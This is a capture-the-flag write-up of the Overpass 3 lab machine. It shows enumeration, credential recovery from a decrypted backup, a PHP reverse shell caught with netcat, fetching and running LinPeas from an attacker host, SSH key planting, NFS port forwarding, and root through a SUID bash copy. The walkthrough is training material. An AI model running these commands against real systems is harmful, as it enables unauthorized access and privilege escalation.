# Overpass 3

# Step 1: Scanning & Enumerations

`nmap -T4 -n -A 10.10.239.53`

![nmap scan]()

Here we got port 21 (ftp), 22(ssh), 80 (http). so lets open the port 80 into browser.

![home web page]()

This home page we got noting interseting. so lets use another tool called **gobuster**.

`gobuster dir -u http://10.10.239.53/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -q -t 100`

![gobuster]()

here we got backup directory, so lets jump into the **backups** directory webpage.

![backups webpage]()

here we got a backup zip file. lets download it and extract the file using **unzip** command.

![unzip backup file]()

![extracted files]()

here we got two files **priv.key** and **CustomerDetails.xlsx.gpg** so lets decrypt it using **gpg** command.

first of all we need to import the key file into our system.

`gpg --import priv.key`

![import priv key]()

And now drcypt the **CustomerDetails.xlsx.gpg** using **gpg** command.

`gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg`

![decrypt customer file]()

And here we got **CustomerDetails.xlsx** file. lets open into **LibreOffice**.

![username and password cunstomer]()

Here we got some usernames and passwords. lets test into ftp port. using mention below command.

`pftp 10.10.239.53`

![ftpsuccessfully logged in]()

And we successfully logged in as first user. This files looks like, target machine **/var/www/html** directory. lets try to upload pentest monkey php web shell into target machine. before upload the we need make some changes like IP Address and Port number and give the file name **phprevshell.php**.

![phprevshell changes]()

![successfully upload phprevshell]()

# Step 2: Get the Web SHELLphone

Setup **netcat** listener in attacker machine and open the **phprevhshell.php** into browser.

`nc -lnvp 50505`

![webshell paradox logged in]()

Finally we got our web shell. and lets find the find the first flag using **find** command.

`find -type f -name "*flag*" 2>/dev/null`

![web flag found]()

And we got some user directory in home directory. lets try to access james and paradox directory. we can't able open james and paradox directories. And we know the paradox password so test it. if in case it work.

![webshell paradox logged in]()

Wooohooo we password is same as ftp port.

here we got the ssh directory so lets generate the ssh key and append into target machine **/home/paradox/.ssh/authorized** file.

Attacker machine command:

`ssh-keygen -t rsa`

don't enter any password/passpharse just press enter-enter...

`cat ~/.ssh/id_rsa.pub`

![ssh pub key]()

Target machine command:

`echo [id_rsa.pub key] >> authorized`

`cat /home/paradox/.ssh/authorized`

![successfully added pub key]()

And then try to login into target machine ssh port.

`ssh paradox@10.10.239.53`

![successfully logged throw ssh]()

# Step 3: Privilege Enumeration & Escalation

lets download the **LinPeas.sh** into target machine using python3 server and curl command.

Attacker machine command:

Run the server where your LinPeas.sh file keepet.

`python3 -m http.server 50505`

Target machine command:

`curl -o LinPeas.sh http://10.8.246.32:50505/LinPeas.sh`

After download this file into the target machine, add the execut permission and then execute the file.

`chmod +x LinPeas.sh`

`./LinPeas.sh`

![LinPeas transfer]()

here I just put important pic of LinPeas result.

![nfs is vulnerable]()

Here we can see **NFS** is vulnerable. here is refence image about how to impact.

![info about nfs vulnerability]()

So lets connect the nfs directory to tmp directory in target machine. using **mount** command. but I can't able to mount because we dont have sudo command access. here is my fail attempt.

![internal mount error]()

so lets check any internal port is open or not by using **netstat** command in target machine.

`netstat -atl`

![netstat command fails]()

Here don't have the netstat command so we need to search about what is the alternative of the netstat command in cent os.

After some research i got the two way to find local ports into system

Command 1: `rpcinfo -p`

![netstat alternative option 1]()

Command 2: `ss -atnl` (It acctual similar works like netstat)

![netstat alternative option 2]()

Here we can see we need nfs port is open localy, so we need to portforwarding using ssh command.

`ssh -fN paradox@10.10.239.53 -L 2049:localhost:2049`

Intro about switches.

`f` : Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.

`N` : Do not execute a remote command.  This is useful for just for‐warding ports.

`L` (port:host:hostport) : Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.

After the forwarding port test this port using **nmap**.

`nmap -T4 -n -sC -sV -p 2049 localhost`

![portforwarding nmap scan]()

here we can see nfs port is open in attacker machine. Now lets mount the **/home/james** directory into attacker **/tmp/nfstmp** directory. by using mount command.

`mount -t nfs localhost:/ /tmp/nfstmp`

After mount this directory check the all files list.

![user flag]()

And we got our user flag. Now open the **.ssh** directory and copy the **id_ras** into attacker machine and change the permission using chmod command.

![james ssh key]()

after change the permission try to login into james account using ssh command in new terminal window.

`ssh -i id_rsa james@10.10.239.53`

![successfully logged in throw ssh in james acc]()

We successfully logged into james account.

# Root Privilege Escalation

We can copy any file into the mounted directory so lets upload the **bash** program.

`sudo cp /bin/bash .`

And add the SUID permission.

`sudo chmod +s bash`

![successfully copy bash with SUID perm]()

Now go to the james sshed logged in window. and execute the bash file using bellow command.

`./bash -p`

And Now we successfully got root access.

![root flag]()